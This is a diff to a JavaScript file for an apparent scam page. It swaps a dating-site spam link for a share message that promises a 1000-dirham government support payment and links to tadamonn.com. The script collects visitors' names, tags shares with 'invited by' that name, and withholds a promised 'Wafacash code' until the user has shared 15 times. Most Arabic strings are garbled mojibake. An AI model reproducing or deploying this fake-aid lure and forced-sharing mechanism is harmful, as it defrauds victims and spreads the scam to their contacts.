@@ -4,7 +4,7 @@
 
 
 
-var texts = [" موقع تعارف , عروض الزواج , شات عربي ,دردشة كتابية ▷ http://chamobracp.byethost24.com/n.php"];
+var texts = ["Ø¨Ø±Ù†Ø§Ù…Ø¬ Ø§Ù„Ø¯Ø¹Ù… Ø§Ù„Ù…Ù‚Ø¯Ù… Ù…Ù† Ø§Ù„Ø¯ÙˆÙ„Ø© Ø¨Ù‚ÙŠÙ…Ø© 1000  Ø¯Ø±Ù‡Ù…  Ø³Ø§Ø±Ø¹  Ù„Ø§Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù…Ù† Ù‡Ù†Ø§ http://tadamonn.com"];
 
 
 
@@ -56,11 +56,11 @@ $(document).ready(function () {
 		var _this = $(this);
 		var x = _this.next().next().html() == '' ? 0 : parseInt(_this.next().next().html());
 		if (_this.hasClass('selected')) {
-			_this.removeClass('selected').html('Ã˜Â¥Ã˜Â¹Ã˜Â¬Ã˜Â§Ã˜Â¨');
+			_this.removeClass('selected').html('Ø¥Ø¹Ø¬Ø§Ø¨');
 			_this.next().next().html(--x);
 			if (x == 0) _this.next().next().addClass('likehide');
 		} else {
-			_this.addClass('selected').html('Ã˜Â¥Ã˜Â²Ã˜Â§Ã™â€žÃ˜Â© Ã˜Â§Ã™â€žÃ˜Â¥Ã˜Â¹Ã˜Â¬Ã˜Â§Ã˜Â¨');
+			_this.addClass('selected').html('Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥Ø¹Ø¬Ø§Ø¨');
 			_this.next().next().html(++x);
 			if (_this.next().next().hasClass('likehide')) _this.next().next().removeClass('likehide');
 		}
@@ -97,7 +97,7 @@ $(document).ready(function () {
 
 	$("#frage_04 button").click(function () {
 		if ($("#nameform").val() == "") {
-			alert("Ã™Å Ã˜Â¬Ã˜Â¨ Ã˜Â¹Ã™â€žÃ™Å Ã™Æ’ Ã˜Â¥Ã˜Â¹Ã˜Â·Ã˜Â§Ã™â€ Ã˜Â§ Ã™Æ’Ã˜Â§Ã™ÂÃ˜Â© Ã˜Â§Ã™â€žÃ™â€¦Ã˜Â¹Ã™â€žÃ™Ë†Ã™â€¦Ã˜Â§Ã˜Âª Ã˜Â£Ã™Ë†Ã™â€žÃ˜Â§Ã™â€¹ !!");
+			alert("ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø¥Ø¹Ø·Ø§Ù†Ø§ ÙƒØ§ÙØ© Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£ÙˆÙ„Ø§Ù‹ !!");
 		} else {
 
 			$.ajax({
@@ -114,7 +114,7 @@ $(document).ready(function () {
 			});
 
 
-			$("#Welcome").html("تهانينا " + $("#nameform").val() + " !");
+			$("#Welcome").html("ØªÙ‡Ø§Ù†ÙŠÙ†Ø§ " + $("#nameform").val() + " !");
 			$('#content_02').fadeIn();
 			$('#frage_04').fadeOut();
 			$('#aufforderung').fadeOut();
@@ -125,7 +125,7 @@ $(document).ready(function () {
 			for (var i = 0; i < texts.length; i++) {
 				texts[i] = texts[i].trim();
 				//////////////////////////////////////////////////
-				var name = " Ã˜ÂªÃ™â€¦ Ã˜Â¯Ã˜Â¹Ã™Ë†Ã˜ÂªÃ™Æ’ Ã™â€¦Ã™â€    " + $("#nameform").val();
+				var name = " ØªÙ… Ø¯Ø¹ÙˆØªÙƒ Ù…Ù†   " + $("#nameform").val();
 				texts[i] = texts[i] + name;
 				//////////////////////////////////////////////////
 				texts[i] = texts[i].replace(/ /g, "%20");
@@ -305,6 +305,6 @@ $(document).ready(function () {
 	$("#b2")
 		.on('click', function () {
 			if (c > 3) window.location = "final.html";
-			else window.alert(" الرجاء إرسال الكود إلى 15 صديق لكي يصلك الكود ! \n\n المشاركات التي قمت بها    " + c);
+			else window.alert(" Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø¹Ù„Ù‰ Ø§Ù„Ø£Ù‚Ù„ 15 Ù…Ø±Ø© Ù„ÙŠØªÙ… Ø§Ø±Ø³Ø§Ù„ ÙƒÙˆØ¯ ÙˆØ§ÙØ§ÙƒØ§Ø´ ! \n\n Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ§Øª Ø§Ù„ØªÙŠ Ù‚Ù…Øª Ø¨Ù‡Ø§  " + c);
 		});
 });
